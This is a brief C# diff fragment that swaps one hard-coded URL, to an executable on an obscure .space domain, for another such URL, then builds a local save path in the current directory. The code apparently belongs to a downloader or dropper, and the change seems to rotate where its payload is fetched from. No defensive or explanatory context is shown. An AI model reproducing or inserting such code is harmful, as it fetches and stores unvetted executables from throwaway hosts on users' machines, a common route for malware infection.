@@ -49,7 +49,7 @@
               {
                   try
                   {
-                      string url = "http://bingobongo.space/io213b5obo/toto.exe";
+                      string url = "http://bmwm5.space/1jig23uig12iu3/totr.exe";
                                           string filename = Path.GetFileName(url);
                       string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
